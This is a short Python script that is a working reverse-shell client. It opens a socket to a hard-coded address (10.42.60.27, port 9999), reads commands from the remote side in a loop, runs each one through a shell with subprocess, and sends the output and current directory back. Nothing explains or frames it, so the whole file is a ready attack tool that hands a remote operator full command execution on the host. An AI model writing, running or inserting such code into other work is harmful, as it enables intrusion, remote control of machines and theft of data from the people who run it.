import socket
import os
import subprocess

s = socket.socket()
host = '10.42.60.27'
port = 9999
s.connect((host,port))


while True:
    data=s.recv(1028)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen( data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output_byts = cmd.stdout.read()+cmd.stderr.read()
        output_str = str(output_byts, "utf-8")
        s.send(str.encode(output_str+str(os.getcwd()) + "> "))
        print(output_str)

# Close Connection
s.close()
